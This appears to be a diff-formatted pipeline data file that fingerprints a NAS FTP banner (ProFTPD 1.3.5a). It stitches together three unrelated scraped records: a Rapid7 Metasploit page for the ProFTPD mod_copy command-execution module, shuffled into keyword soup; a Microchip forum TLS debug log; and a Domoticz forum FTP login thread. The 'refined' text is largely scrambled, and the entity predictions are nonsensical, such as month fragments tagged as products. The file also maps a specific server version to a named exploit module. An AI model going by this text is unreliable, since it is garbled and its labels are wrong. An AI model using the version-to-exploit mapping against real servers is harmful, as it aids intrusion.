+ proposal select product metasploit insightidr insightvm insightops insightappsec appspider nexpose first name last name job title company email address phone country state managed vulnerability management managed application security consulting services advisory services incident response services penetration testing services iot security services training siem free trial insightvm vulnerability management free trial insightappsec dynamic application security testing free trial insightconnect orchestration automation request demo insightops log management free trial metasploit penetration testing free trial appspider application security partner research blog docs support free trial helpful links product support product pricing resource library events vadim melihow xistence platform unix architectures cmd development source code history references cve siem insightvm vulnerability management insightappsec dynamic application security testing insightconnect orchestration automation insightops log management metasploit penetration testing appspider application security services helpful links product support product pricing resource library events solution helpful links product support product pricing resource library events exploit database modules en english deutsch 日本語 blog docs support sign us contact blog support login careers © rapid7 legal terms resources product support resource library customer stories events contact general demo request pricing professional services request full details main menu products insightidr user behavior analytics penetration test free metasploit pro trial view protection services managed services managed detection 1 – 866 – 7 – rapid7 sales rapid7 partners sales partners technology partners find certification partners sales partners technology partners find rapid7 services rapid7 global services need press releases customers public policy investors connect insight products insightidr user behavior analytics ir managed services managed detection efficient penetration test simulate complex attacks show targets ... targets ... msf exploit free trial rapid7 vulnerability insight cloud overviewinsight cloud pricing try 1 – 866 – 390 – 8113 solutions industry solutions compliance solutions support exploit penetration testing software 5 mod_copy command execution disclosed 04 premise free trial tcell partner research home vulnerability incident response need immediate help protection request demo view rapid7 insight cloud rapid7 insight us company leadership news trust chat contact us success security fundamentals vulnerability set options ... msf exploit 5 mod_copy command execution back rapid7 application monitoring php remote code execution 5 mod_copy command execution com incident response set target msf exploit show options ... show exploit database proftpd 1 show advanced ': msf receive emails regarding rapid7 top customer support full service support rapid7 quick cookie notification offensive security teams ready automate every step toll free webcasts training offensive security sales support security program please contact us metasploit framework metasploit console need immediate help services proftpd_modcopy_exec msf exploit view cookie policy task keeps us exploit database proftpd version 1 com support contact us rapid7 products press releases automation search proftpd 1 – jim site without changing site uses cookies 36742 module options key features collect 2015 created 05 ir solutions support show options response com sales users test unix submit general partner certification view proftpd 1 rapid7 reason contact info use exploit privacy policy premise tcell certification news user analytics 866 proftpd service available options php payload details cookie settings rapid7 site cpfr products please refer features time module within module exploits website directory unauthenticated client touch shortly something manually make sure made possible export notice existing libraries default runs chosen destination amplify efficiency advertising purposes 8113 5 390 3306 edb 2018 description 1 need ’ gorman let ’ cpto commands copy files copy commands certification back ir home automate teams search proftpd_modcopy_exec com 2015 ’ copy commands use info wheel want visibility vert using unite thank systems successful submission strategy share self secops run rights reseller rapid questions proc problem privileges president precious planning personalization part oops nobody mdr may matters load leveraging leverage information including happy hand go ftp focus filesystem experts executed equipping efforts display defenses create covered continue consultant conduct cmdline click change browse breach automating author answer agree 844 7rapid7 30 3 22
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+NER Predictions: 
+{
+  "vendors": [],
+  "device_types": [],
+  "products": [
+    "rapid7.com",
+    "rapid7",
+    "rapid7"
+  ]
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Local Dependencies: 
+[]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Raw Data: 
+220 NASFTPD Turbo station 1.3.5a Server (ProFTPD)
+Refined:  220 nasftpd turbo station 1 5a server proftpd
+
+============================https://www.microchip.com/forums/download.axd?file=0;943724===============================
+
+TCP/IP Stack: Initialization Started
+Starting the test.
+Comparator-4 has detected ADC value to be between 3100 and 4000
+Voltage on VBat: 2711 mV
+MAC address read from eeprom: D8:80:39:54:3D:68
+TCP/IP Stack: Initialization Ended - success
+APP_Manager: FATFS File System is mounted
+APP_Manager: SD Card is Write Enabled
+APP_Manager: TCP/IP stack initialised
+>app_FTP: Starting connection
+app_FTP: << 220 NASFTPD Turbo station 1.3.5a Server (ProFTPD) [192.168.190.200]
+app_FTP: >> AUTH TLS
+app_FTP: << 234 AUTH TLS successful
+app_FTP: Connection Opened: Starting SSL Negotiation
+Adding a CA
+Got Cert Header
+Got Algo ID
+Getting Cert Name
+Getting Cert Name
+Got Subject Name
+Got Key
+Parsed Past Key
+Parsed new CA
+Freeing Parsed CA
+Freeing der CA
+OK Freeing der CA
+growing output buffer
+Shrinking output buffer
+connect state: CLIENT_HELLO_SENT
+WolfSSL ERROR: -323
+app_FTP: SSL Connection Still Negotiating
+growing input buffer
+received record layer msg
+processing server hello
+growing input buffer
+WolfSSL ERROR: -323
+app_FTP: SSL Connection Still Negotiating
+WolfSSL ERROR: -323
+app_FTP: SSL Connection Still Negotiating
+received record layer msg
+processing certificate
+Loading peer's cert chain
+Put another cert into chain
+Verifying Peer's cert
+Got Cert Header
+Got Algo ID
+Getting Cert Name
+Getting Cert Name
+Got Subject Name
+Got Key
+Parsed Past Key
+Verified Peer's cert
+received record layer msg
+No KeyExchange required
+processing server hello done
+connect state: HELLO_AGAIN
+connect state: HELLO_AGAIN_REPLY
+connect state: FIRST_REPLY_DONE
+connect state: FIRST_REPLY_FIRST
+growing output buffer
+Shrinking output buffer
+sent: client key exchange
+connect state: FIRST_REPLY_SECOND
+connect state: FIRST_REPLY_THIRD
+growing output buffer
+Shrinking output buffer
+sent: change cipher spec
+connect state: FIRST_REPLY_FOURTH
+growing output buffer
+*** now the app has hung in pic32mz-hash.c wait_engine(...)
+uc_desc->bd[0].BD_CTRL.DESC_EN = 1
+***
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Refined Data: 
+220 NASFTPD Turbo station 1.3.5a Server (ProFTPD)
+Refined:  220 nasftpd turbo station 1 5a server proftpd
+
+============================https://www.microchip.com/forums/download.axd?file=0;943724===============================
+
+ ca got cert header got algo id getting cert name getting cert name got subject name got key parsed past key parsed new ca freeing parsed ca freeing der ca ok freeing der ca growing output buffer shrinking output buffer connect state cert got cert header got algo id getting cert name getting cert name got subject name got key parsed past key verified peer ssl connection still negotiating growing input buffer received record layer msg processing server hello growing input buffer wolfssl error ssl connection still negotiating received record layer msg processing certificate loading peer first_reply_third growing output buffer shrinking output buffer sent first_reply_first growing output buffer shrinking output buffer sent keyexchange required processing server hello done connect state cert received record layer msg ssl connection still negotiating wolfssl error cert chain put another cert first_reply_fourth growing output buffer *** client key exchange connect state c wait_engine (...) uc_desc -> bd << 220 nasftpd turbo station 1 change cipher spec connect state << 234 auth tls successful app_ftp 2711 mv mac address read client_hello_sent wolfssl error starting ssl negotiation adding hello_again_reply connect state hello_again connect state first_reply_second connect state first_reply_done connect state chain verifying peer >> auth tls app_ftp starting connection app_ftp 5a server connection opened fatfs file system detected adc value 0 ]. bd_ctrl initialization started starting write enabled app_manager ip stack initialised 1 *** 323 app_ftp ip stack initialization ended success app_manager mounted app_manager sd card 4000 voltage 68 tcp app_ftp tcp vbat test proftpd pic32mz hung hash eeprom desc_en d8 comparator app 80 54 4 3d 39 3100 3 200 192 190 168
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+NER Predictions: 
+{
+  "vendors": [],
+  "device_types": [],
+  "products": [
+    "pic32mz",
+    "d8"
+  ]
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Local Dependencies: 
+[]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Raw Data: 
+220 NASFTPD Turbo station 1.3.5a Server (ProFTPD)
+Refined:  220 nasftpd turbo station 1 5a server proftpd
+
+============================https://www.domoticz.com/forum/viewtopic.php?t=10366===============================
+
+[Solved] FTP connection to NAS fails - Domoticz
+Skip to content
+Search
+Advanced search
+Quick links
+Unanswered topics
+Active topics
+Search
+Members
+The team
+FAQ
+Wiki
+Login
+Register
+Board index
+Domoticz
+Installation, Compiling, Permissions, Security and Starting
+Search
+[Solved] FTP connection to NAS fails
+On various Hardware and OS systems:
+pi / windows / routers / nas, etc
+Moderator: leecollings
+Post Reply
+Print view
+Search
+Advanced search
+3 posts
+• Page 1 of 1
+ReneF
+Posts: 5 Joined: Friday 29 January 2016 14:46
+Target OS: Raspberry Pi
+Domoticz version: V2.3530
+Location: Berkhout
+Contact:
+Contact ReneF
+Send private message
+[Solved] FTP connection to NAS fails
+Quote
+Post
+by ReneF » Wednesday 03 February 2016 1:20
+I implemented the Domoticz_backup.sh script according the Wiki (Daily backup to external hdd) with the only changes made in IP numbers and user name and password.
+Running the test via a SSH connection I get a 530 access denied message.
+(see below) On my NAS the user has all right's for access. Trying the path directly in a web browser works fine, including logging in on the NAS using the username and password
+About to connect() to 192.168.1.40 port 21 (#0)
+*
+Trying 192.168.1.40...
+* connected
+* Connected to 192.168.1.40 (192.168.1.40) port 21 (#0)
+* FTP 0x174afb8 state change from STOP to WAIT220
+< 220 NASFTPD Turbo station 1.3.5a Server (ProFTPD) [192.168.1.40]
+> USER “user”
+* FTP 0x174afb8 state change from WAIT220 to USER
+< 331 Password required for “user”
+> PASS “password”
+* FTP 0x174afb8 state change from USER to PASS
+< 530 Login incorrect.
+* Access denied: 530
+* Closing connection #0
+Does any one have a suggestion what could be the case?
+Last edited by ReneF on Thursday 04 February 2016 0:00, edited 1 time in total.
+Top
+pepijn
+Posts: 511 Joined: Friday 12 July 2013 13:19
+Target OS: Raspberry Pi
+Domoticz version:
+Location: The Netherlands
+Contact:
+Contact pepijn
+Send private message
+Re: FTP connection to NAS fails
+Quote
+Post
+by pepijn » Wednesday 03 February 2016 1:56
+Try to remove the quotes
+Top
+ReneF
+Posts: 5 Joined: Friday 29 January 2016 14:46
+Target OS: Raspberry Pi
+Domoticz version: V2.3530
+Location: Berkhout
+Contact:
+Contact ReneF
+Send private message
+Re: FTP connection to NAS fails
+Quote
+Post
+by ReneF » Wednesday 03 February 2016 11:09
+Thanks Pepijn.
+You're suggestion worked. Maybe a good idea to mention this in the wiki.
+Secondly I discovered that the NAS does not allow to write to a directory that is not created before running this script (see below)
+> CWD Domoticz_backup
+< 550 Domoticz_backup: No such file or directory
+* Server denied you to change to the given directory
+Rene
+Top
+Post Reply
+Print view
+Display: All posts1 day7 days2 weeks1 month3 months6 months1 year
+Sort by: AuthorPost timeSubject
+Direction: AscendingDescending
+3 posts
+• Page 1 of 1
+Return to “Installation, Compiling, Permissions, Security and Starting”
+Jump to
+General
+↳   News & Updates
+↳   General Discussion
+↳   Bugs and Problems
+↳   Other questions and discussions
+↳   Suggestions
+Domoticz
+↳   Installation, Compiling, Permissions, Security and Starting
+↳   Cameras
+↳   Switches and Scenes
+↳   Utility
+↳   Temperature and Weather
+↳   Heating/cooling
+↳   OpenTherm gateway
+↳   Third party and supplementary tools
+↳   Android
+↳   iOS
+↳   Windows
+↳   Kodi (XBMC)
+↳   Domoboard
+↳   Dashticz
+↳   Design, usability and languages
+↳   Language / Translation
+Scripting & automation
+↳   dzVents
+↳   Bugs
+↳   Examples & Solutions
+↳   LUA
+↳   Bash / PowerShell / Batch etc.
+↳   Blockly
+↳   Python
+↳   PHP and all others
+Hardware and Protocols
+↳   Z-Wave
+↳   Device information
+↳   Others
+↳   Zigbee
+↳   Speech & Voice Systems
+↳   433 & 868 transceiver
+↳   RFLink Transceiver
+↳   Rfxcom Transceiver
+↳   DIY Hardware and Protocols
+↳   ESP8266
+↳   PiFace
+↳   Raspberry Pi GPIO ( WiringPi )
+↳   MySensors
+↳   1-wire
+Community
+↳   Sales, Deals and Bargains..
+↳   Deals & bargains
+↳   Forum feedback
+↳   Show your projects
+↳   Projects on other sites
+Who is online
+Users browsing this forum: No registered users and 1 guest
+Board index
+All times are UTC+02:00
+Delete cookies
+Members
+The team
+Powered by phpBB® Forum Software © phpBB Limited
+Privacy
+|
+Terms
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Refined Data: 
+220 NASFTPD Turbo station 1.3.5a Server (ProFTPD)
+Refined:  220 nasftpd turbo station 1 5a server proftpd
+
+============================https://www.domoticz.com/forum/viewtopic.php?t=10366===============================
+
+ content search advanced search quick links unanswered topics active topics search members leecollings post reply print view search advanced search 3 posts • page 1 868 transceiver ↳ rflink transceiver ↳ rfxcom transceiver ↳ diy hardware wave ↳ device information ↳ others ↳ zigbee ↳ speech supplementary tools ↳ android ↳ ios ↳ windows ↳ kodi posts1 day7 days2 weeks1 month3 months6 months1 year sort given directory rene top post reply print view display protocols ↳ esp8266 ↳ piface ↳ raspberry pi gpio phpbb ® forum software © phpbb limited privacy team faq wiki login register board index domoticz installation cooling ↳ opentherm gateway ↳ third party automation ↳ dzvents ↳ bugs ↳ examples renef » wednesday 03 february 2016 11 renef » wednesday 03 february 2016 1 pepijn » wednesday 03 february 2016 1 ascendingdescending 3 posts • page 1 ↳ domoboard ↳ dashticz ↳ design ↳ blockly ↳ python ↳ php updates ↳ general discussion ↳ bugs discussions ↳ suggestions domoticz ↳ installation bargains ↳ forum feedback ↳ show solutions ↳ lua ↳ bash scenes ↳ utility ↳ temperature thursday 04 february 2016 0 starting ↳ cameras ↳ switches friday 29 january 2016 14 friday 12 july 2013 13 220 nasftpd turbo station 1 contact renef send private message contact pepijn send private message ↳ mysensors ↳ 1 1 guest board index raspberry pi domoticz version 40 port 21 (# 0 quotes top renef posts wire community ↳ sales 00 delete cookies members bargains .. ↳ deals nas fails quote post voice systems ↳ 433 port 21 (# 0 web browser works fine top pepijn posts protocols ↳ z 1 renef posts general ↳ news starting search ftp 0x174afb8 state change weather ↳ heating projects ↳ projects languages ↳ language user “ user ” 530 access denied message pass “ password ” 530 login incorrect others hardware edited 1 time 09 thanks pepijn starting ” jump “ user ” authorpost timesubject direction “ installation 46 target os 331 password required 19 target os problems ↳ online users browsing sh script according team powered domoticz skip various hardware 1 return 3 os systems windows netherlands contact berkhout contact nas fails wiki ftp connection forum directory access denied 1 user name pi server denied 40 ... renef registered users last edited nas using translation scripting test via ssh connection path directly ip numbers including logging good idea external hdd etc moderator daily backup connect () closing connection changes made batch etc 5a server 56 try 511 joined 5 joined 0 cwd domoticz_backup 550 domoticz_backup suggestion worked 3530 location trying 192 user password 530 40 pass deals change 00 access nas script domoticz_backup trying suggestion location 192 xbmc write wiringpi wait220 v2 utc username usability total times terms stop solved sites see security secondly running routers right remove questions proftpd powershell permissions one mention maybe implemented get file discovered created could connected compiling case allow 20 168 02
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+NER Predictions: 
+{
+  "vendors": [
+    "team"
+  ],
+  "device_types": [],
+  "products": [
+    "posts1",
+    "day7",
+    "days2",
+    "weeks1",
+    "month3",
+    "months6",
+    "months1",
+    "esp8266",
+    "x174afb8",
+    "wait220",
+    "v2"
+  ]
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Local Dependencies: 
+[]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
